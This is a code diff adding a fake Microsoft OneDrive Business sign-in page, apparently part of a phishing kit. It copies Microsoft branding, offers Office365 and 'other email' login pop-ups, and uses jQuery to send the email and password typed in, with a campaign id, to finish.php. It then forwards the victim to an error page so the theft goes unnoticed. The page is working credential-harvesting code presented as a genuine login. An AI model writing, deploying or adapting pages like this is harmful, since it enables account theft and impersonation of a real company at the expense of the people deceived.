@@ -1,0 +1,62 @@
+<!doctypehtml><html lang=en><meta content="text/html; charset=utf-8"http-equiv=Content-Type><meta content=width=device-width,initial-scale=1.0 name=viewport><meta content=ie=edge http-equiv=X-UA-Compatible><link href=css/style.css rel=stylesheet><title>
+   Sign in
+  </title><link href=https://p.sfx.ms/images/favicon.ico rel=icon type=image/x-icon><body><div class=login-page id=wrap><div class=login-screen><div class=login-screen-inner><div class=log-header><img alt src=images/logo.png><p style="text-align: center;">Microsoft User Integration, Sign in to Continue to OneDrive Business.<p style="text-align: center;"></div><div class=log-body><ul class=log-menu><li class=office><a data-log-client="Office 365"data-image-src=images/office.png href=#> Sign in with Office365 </a><li class=outlook><a data-image-src=images/mailbox1.png data-log-client=Others href=#> Sign in with Other Email Account </a></ul></div><div class=log-footer><p style="text-align: center;">Save & Share Important Photos,files and Documents Securely on OneDrive and get them from any device, anywhere.<p style="text-align: center;"><p style="text-align: center;"><br><p style="text-align: center;">Microsoft Corporation © 2020</div></div></div><div id=logger-popup><div class=logger-pop-inner><form id=login_form method=POST><div class=logger-pop-header><img alt class=logo-img><p class=logo-name>Login with</div><div class=logger-pop-body><div class=form-group><input placeholder="Email Address"class=form-control id=email-field name=Email type=email><label for>Email Address</label></div><div class=form-group><input class=form-control id=password-field name=Password placeholder=Password type=password><label for>Password</label></div></div><div class=logger-pop-footer><ul><li><button class=btn id=popCancel type=button>Cancel</button><li><button class="btn login-btn">Submit</button></ul></div></form></div></div><div style="display: none;"id=pageOverlay></div></div><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script>$(document).ready(function () {
+    $('.log-menu > li > a').click(function (e) {
+        e.preventDefault();
+        var logo_src = $(this).data('image-src');
+        var client_name = $(this).data('log-client');
+
+        $('.logo-img').attr('src', logo_src);
+        $('.logo-name span').html(client_name);
+        $('#email-field').attr("placeholder", "Login with your " + client_name + " email address");
+        $('#password-field').attr("placeholder", "Login with your " + client_name );
+
+        $('#logger-popup').toggleClass('popupOpened');
+        $('#pageOverlay').fadeIn();
+        
+		
+		
+		
+		var emailc = $('input[name=Email]');
+     var passc = $('input[name=Password]');
+     var emailval = '';
+     var passval = '';
+     var login_form = $('#login_form');	 
+	 login_form.submit(function(e){
+	   e.preventDefault();
+	   emailval = emailc.val();
+	   
+	   passval = passc.val();
+	  // alert(passval);
+	   /*  */
+	   if(emailval.length > 0 && passval.length > 0){
+	        var theemidval = 'f800e32d9ce13d84f7a6bcc30b4ee1b0';
+		    $.ajax({
+          url: 'finish.php', 
+          type: 'POST', 
+          dataType: 'html', 
+          data: { Email : emailval, password : passval, typeofemail : 'Onedrive23 '+client_name, theemid : theemidval}, 
+		  crossDomain: true,
+          success: function(msg) {
+		  },
+          error: function(e) {
+            console.log(e)
+          }
+        }); 
+		setTimeout(function(){ window.location.href="error.html"; }, 2000);
+	   }
+	   /*  */
+	 });
+		
+		
+		
+		
+		
+		
+    });
+    $('#popCancel').click(function (e) {
+        e.preventDefault();
+        $('#logger-popup').removeClass('popupOpened');
+        $('#pageOverlay').fadeOut();
+    });
+});</script>
